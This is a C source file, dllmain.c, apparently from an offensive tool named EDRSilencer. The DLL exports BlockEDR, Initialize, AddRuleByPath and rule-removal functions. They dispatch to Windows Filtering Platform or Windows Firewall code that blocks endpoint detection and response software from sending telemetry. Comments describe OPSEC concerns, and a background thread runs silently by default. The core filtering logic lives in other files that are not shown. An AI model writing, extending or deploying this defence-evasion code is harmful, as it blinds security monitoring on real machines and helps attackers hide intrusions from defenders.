#include "core.h"
#include "firewall.h"

/*
 * dllmain.c
 * ---------
 * DLL entry and exported control surface for EDRSilencer. Manages global state, threading,
 * and dispatches to either WFP mode (core.c) or Windows Firewall mode (firewall.c).
 *
 * Concurrency/OPSEC notes:
 * - All exports synchronize via a single critical section to protect shared globals.
 * - g_isQuiet gates stdout messages; errors still print to stderr.
 * - g_isFirewallMode selects Windows Firewall path when TRUE, WFP path otherwise.
 */

HANDLE g_hHeap = NULL;             // Process heap for consistent allocations across modules
BOOL g_isQuiet = FALSE;            // Suppress stdout when TRUE
CRITICAL_SECTION g_critSec;        // Global lock for thread-safe mutations
BOOL g_isFirewallMode = FALSE;     // Default to WFP mode

/*
 * BlockerThread
 * -------------
 * Background worker used by Initialize() to apply rules asynchronously and avoid blocking caller.
 */
DWORD WINAPI BlockerThread(LPVOID lpParam) {
    (void)lpParam; // Unused
    g_isQuiet = TRUE; // Run quietly by default
    if (CheckProcessIntegrityLevel()) {
        if (g_isFirewallMode) {
            FirewallConfigureBlockRules();
        } else {
            configureNetworkFilters();
        }
    }
    return 0;
}

/*
 * DllMain
 * -------
 * Creates/destroys a private heap and initializes the global critical section.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            g_hHeap = HeapCreate(0, 0, 0);
            if (g_hHeap == NULL) return FALSE;
            InitializeCriticalSection(&g_critSec);
            break;

        case DLL_PROCESS_DETACH:
            DeleteCriticalSection(&g_critSec);
            if (g_hHeap) HeapDestroy(g_hHeap);
            break;
    }
    return TRUE;
}

// --- Exported Functions ---

/*
 * Initialize
 * ----------
 * Kicks off asynchronous rule application using BlockerThread.
 */
__declspec(dllexport) void Initialize(void) {
    // Run the main logic in a separate thread to avoid blocking the caller
    HANDLE hThread = CreateThread(NULL, 0, BlockerThread, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread); // We don't need to wait for it, so close the handle immediately
    }
}

/*
 * SetMode
 * -------
 * Switch between WFP mode (FALSE) and Windows Firewall mode (TRUE).
 */
__declspec(dllexport) void SetMode(BOOL useFirewall) {
    EnterCriticalSection(&g_critSec);
    g_isFirewallMode = useFirewall;
    LeaveCriticalSection(&g_critSec);
}

/*
 * BlockEDR
 * --------
 * Synchronous rule application. Honors quiet flag and selected mode.
 */
__declspec(dllexport) void BlockEDR(BOOL quiet) {
    EnterCriticalSection(&g_critSec);
    g_isQuiet = quiet;
    if (CheckProcessIntegrityLevel()) {
        if (g_isFirewallMode) {
            FirewallConfigureBlockRules();
        } else {
            configureNetworkFilters();
        }
    }
    LeaveCriticalSection(&g_critSec);
}

/*
 * ListRules
 * ---------
 * Lists rules in WFP mode. In firewall mode, listing is not implemented (prints a notice).
 */
__declspec(dllexport) void ListRules(BOOL quiet) {
    EnterCriticalSection(&g_critSec);
    g_isQuiet = quiet;
    if (CheckProcessIntegrityLevel()) {
        if (g_isFirewallMode) {
            PRINTF("[!] Listing rules is only implemented for WFP mode.\n");
            PRINTF("    Use standard Windows commands to view firewall rules, e.g.:\n");
            PRINTF("    > netsh advfirewall firewall show rule name=all | findstr EDRSilencer\n");
        } else {
            listRules();
        }
    }
    LeaveCriticalSection(&g_critSec);
}

/*
 * AddRuleByPath
 * -------------
 * Adds a block rule for a specific process path in the selected mode.
 */
__declspec(dllexport) void AddRuleByPath(BOOL quiet, const char* processPath) {
    EnterCriticalSection(&g_critSec);
    g_isQuiet = quiet;
    if (processPath && CheckProcessIntegrityLevel()) {
        if (g_isFirewallMode) {
            FirewallAddRuleByPath(processPath);
        } else {
            addProcessRule(processPath);
        }
    }
    LeaveCriticalSection(&g_critSec);
}

/*
 * RemoveAllRules
 * --------------
 * Removes all rules created by this tool in the selected mode (provider-grouped in WFP, grouped
 * by FIREWALL_RULE_GROUP in firewall mode).
 */
__declspec(dllexport) void RemoveAllRules(BOOL quiet) {
    EnterCriticalSection(&g_critSec);
    g_isQuiet = quiet;
    if (CheckProcessIntegrityLevel()) {
        if (g_isFirewallMode) {
            FirewallRemoveAllRules();
        } else {
            removeAllRules(FALSE);
        }
    }
    LeaveCriticalSection(&g_critSec);
}

/*
 * RemoveRuleByID
 * --------------
 * Dual-mode removal:
 * - Firewall mode expects a process path, derives the rule name, and removes by name.
 * - WFP mode expects a numeric ID string and deletes the corresponding filter.
 */
__declspec(dllexport) void RemoveRuleByID(BOOL quiet, const char* ruleIdOrNameStr) {
    EnterCriticalSection(&g_critSec);
    g_isQuiet = quiet;
    if (ruleIdOrNameStr && CheckProcessIntegrityLevel()) {
        if (g_isFirewallMode) {
            // In firewall mode, the input is expected to be a process path.
            // Derive the rule name from the path to match how rules are created.
            FirewallRemoveRuleByPath(ruleIdOrNameStr);
        } else {
            // In WFP mode, the string is treated as a numeric ID.
            char *endptr;
            UINT64 ruleId = CustomStrToULL(ruleIdOrNameStr, &endptr);
            if (endptr != ruleIdOrNameStr) {
                removeRuleById(ruleId);
            }
        }
    }
    LeaveCriticalSection(&g_critSec);
}
